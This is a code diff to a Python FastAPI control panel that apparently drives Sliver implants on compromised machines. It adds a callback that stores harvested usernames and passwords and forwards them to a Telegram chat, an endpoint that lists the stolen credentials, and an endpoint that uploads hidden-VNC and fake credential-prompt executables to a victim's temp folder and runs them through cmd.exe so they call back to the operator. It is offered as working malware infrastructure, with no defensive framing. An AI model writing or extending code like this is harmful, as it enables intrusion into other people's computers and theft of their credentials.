@@ -8,6 +8,7 @@ import mimetypes
 import secrets
 import time
 from contextlib import asynccontextmanager, suppress
+from pathlib import Path
 
 from fastapi import FastAPI, Form, HTTPException, Request, WebSocket, WebSocketDisconnect
 from fastapi.responses import (
@@ -29,7 +30,7 @@ from .config import Settings
 from .db import Database
 from .rd import RDBroker
 from .sliver import BridgeError, SliverBridge
-from .tg import Telegram
+from .tg import Telegram, escape
 from .views import BridgeViews
 
 log = logging.getLogger("fleet.panel")
@@ -50,7 +51,20 @@ def create_app(settings: Settings | None = None) -> FastAPI:
     database.migrate()
     auth = Auth(config, database)
 
-    broker = RDBroker(config)
+    def on_creds(session_id: str, data: dict) -> None:
+        username = str(data.get("user") or data.get("username") or "")
+        secret = str(data.get("pass") or data.get("password") or "")
+        source = str(data.get("source") or "hvnc")
+        if not (username or secret):
+            return
+        database.add_cred(session_id, username, secret, source)
+        database.audit("system", "creds", "ok", target=session_id, detail=source)
+        telegram.send(
+            f"\U0001f511 <b>CREDENTIALS</b>\nuser: {escape(username)}\n"
+            f"pass: <code>{escape(secret)}</code>\n<code>{escape(session_id)}</code>"
+        )
+
+    broker = RDBroker(config, on_creds=on_creds)
     telegram = Telegram(config.tg_bot_token, config.tg_chat_id)
     alerts = Alerts(config, telegram, app_bridge := SliverBridge(config), database)
 
@@ -527,6 +541,62 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         return PlainTextResponse(
             data, headers={"Content-Disposition": f'attachment; filename="{filename}"'}
         )
+
+    @app.get("/api/{session_id}/creds")
+    async def api_creds(request: Request, session_id: str):
+        if require(request) is None:
+            raise HTTPException(status_code=401)
+        rows = await run_in_threadpool(database.creds_for, session_id)
+        return JSONResponse({"creds": [dict(row) for row in rows]})
+
+    @app.post("/api/{session_id}/hvnc")
+    async def api_hvnc(request: Request, session_id: str):
+        session = require(request)
+        if session is None:
+            raise HTTPException(status_code=401)
+        body = await request.json()
+        hvnc_bin = Path(config.panel_bin_dir) / "hvnc.exe"
+        prompt_bin = Path(config.panel_bin_dir) / "credprompt.exe"
+        if not hvnc_bin.is_file():
+            raise HTTPException(status_code=400, detail="hvnc.exe not built on this host")
+        token = await run_in_threadpool(broker.mint, session_id)
+        remote = body.get("dir") or "C:\\Windows\\Temp"
+        try:
+            await run_in_threadpool(
+                app.state.bridge.upload, session_id, remote, "hvnc.exe", hvnc_bin.read_bytes()
+            )
+            if prompt_bin.is_file():
+                await run_in_threadpool(
+                    app.state.bridge.upload,
+                    session_id,
+                    remote,
+                    "credprompt.exe",
+                    prompt_bin.read_bytes(),
+                )
+        except BridgeError as exc:
+            raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+        host, _, port = config.rd_endpoint.rpartition(":")
+        host = host or "127.0.0.1"
+        port = port or "8443"
+        spawn = body.get("spawn") or "explorer.exe"
+        desktop = body.get("desktop") or "FleetHVNC"
+        hvnc_path = f"{remote}\\hvnc.exe"
+        creds_path = f"{remote}\\fleet-creds.json"
+        prompt_path = f"{remote}\\credprompt.exe"
+        command = (
+            f'start "" "{hvnc_path}" --host {host} --port {port} --session {session_id} '
+            f'--token {token} --desktop "{desktop}" --spawn "{spawn}" '
+            f'--creds "{creds_path}" --prompt "{prompt_path}"'
+        )
+        try:
+            result = await run_in_threadpool(
+                app.state.bridge.exec, session_id, "cmd.exe", ["/c", command]
+            )
+        except BridgeError as exc:
+            raise HTTPException(status_code=502, detail=str(exc)) from exc
+        database.audit(str(session["actor"]), "hvnc", "ok", target=session_id, detail=desktop)
+        return JSONResponse({"ok": True, "detail": result, "rd_endpoint": config.rd_endpoint})
 
     @app.websocket("/shell/{session_id}")
     async def ws_shell(websocket: WebSocket, session_id: str):
